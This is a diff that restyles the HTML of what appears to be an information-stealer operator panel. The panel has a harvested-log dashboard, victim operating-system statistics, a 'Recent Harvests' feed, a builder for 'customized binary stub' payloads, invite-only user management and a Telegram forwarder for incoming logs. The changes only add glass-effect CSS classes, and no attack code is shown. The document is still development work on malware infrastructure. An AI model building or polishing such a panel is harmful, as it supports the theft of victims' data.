@@ -88,7 +88,7 @@
                 </header>
 
                 <div class="stats-grid">
-                    <div class="stat-card">
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
                         <div class="stat-icon purple">
                             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                         </div>
@@ -97,7 +97,7 @@
                             <h3 id="stat-total-logs">0</h3>
                         </div>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
                         <div class="stat-icon gold">
                             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/></svg>
                         </div>
@@ -106,7 +106,7 @@
                             <h3 id="stat-logs-today">0</h3>
                         </div>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card liquid-glass liquid-glass-tilt">
                         <div class="stat-icon blue">
                             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                         </div>
@@ -119,7 +119,7 @@
 
                 <div class="dashboard-charts">
                     <!-- Operating Systems Card -->
-                    <div class="panel-card os-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge os-card">
                         <h3>Operating Systems</h3>
                         <div class="os-list" id="os-list">
                             <p class="empty-state">No OS data available yet.</p>
@@ -127,7 +127,7 @@
                     </div>
 
                     <!-- Recent Activity Card -->
-                    <div class="panel-card activity-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge activity-card">
                         <h3>Recent Harvests</h3>
                         <div class="recent-list" id="recent-list">
                             <p class="empty-state">No recent activity.</p>
@@ -179,7 +179,7 @@
                 </header>
 
                 <div class="builder-grid">
-                    <div class="panel-card builder-form-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge builder-form-card">
                         <h3>Configuration Options</h3>
                         
                         <div class="form-group">
@@ -242,7 +242,7 @@
                     </div>
 
                     <!-- Builder Console Logs -->
-                    <div class="panel-card builder-console-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge builder-console-card">
                         <h3>Build Logging</h3>
                         <div class="console-output" id="build-console">
                             <span class="log-info">Ready to build customized binary stub template...</span>
@@ -260,14 +260,14 @@
 
                 <div class="admin-stats-row" id="admin-stats-row"></div>
 
-                <div class="panel-card">
+                <div class="panel-card liquid-glass liquid-glass-edge">
                     <h3>User Management</h3>
                     <div class="admin-users-table" id="admin-users-table">
                         <div class="empty-state py-8">Loading users...</div>
                     </div>
                 </div>
 
-                <div class="panel-card">
+                <div class="panel-card liquid-glass liquid-glass-edge">
                     <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
                         <h3>Invitation Codes</h3>
                         <button class="btn btn-primary btn-sm" id="btn-gen-invite">Generate Invite</button>
@@ -287,7 +287,7 @@
 
                 <div class="settings-grid">
                     <!-- Appearance Card -->
-                    <div class="panel-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge">
                         <h3>Custom Theme & Background</h3>
                         <p class="card-desc">Select a built-in background theme, or upload your own image.</p>
                         
@@ -322,7 +322,7 @@
                     </div>
 
                     <!-- Telegram Forwarder settings -->
-                    <div class="panel-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge">
                         <h3>Telegram Notification Forwarder</h3>
                         <p class="card-desc">Automatically forward all incoming logs directly to a Telegram bot.</p>
 
@@ -356,7 +356,7 @@
                     </div>
 
                     <!-- Panel Preferences settings -->
-                    <div class="panel-card">
+                    <div class="panel-card liquid-glass liquid-glass-edge">
                         <h3>Panel Preferences</h3>
                         <p class="card-desc">Configure sound notifications and client auto-refresh preferences.</p>
 
@@ -393,7 +393,7 @@
     <div class="modal" id="details-modal">
         <div class="modal-backdrop"></div>
         <div class="modal-wrapper">
-            <div class="modal-card">
+            <div class="modal-card liquid-glass liquid-glass-edge">
                 <div class="modal-header">
                     <div>
                         <h3 id="modal-title">Log Inspection</h3>
@@ -454,7 +454,7 @@
 
     <!-- Custom Confirm/Alert Dialog -->
     <div class="dialog-overlay" id="dialog-overlay">
-        <div class="dialog-card">
+        <div class="dialog-card liquid-glass liquid-glass-edge">
             <div class="dialog-icon" id="dialog-icon"></div>
             <h3 class="dialog-title" id="dialog-title"></h3>
             <p class="dialog-message" id="dialog-message"></p>
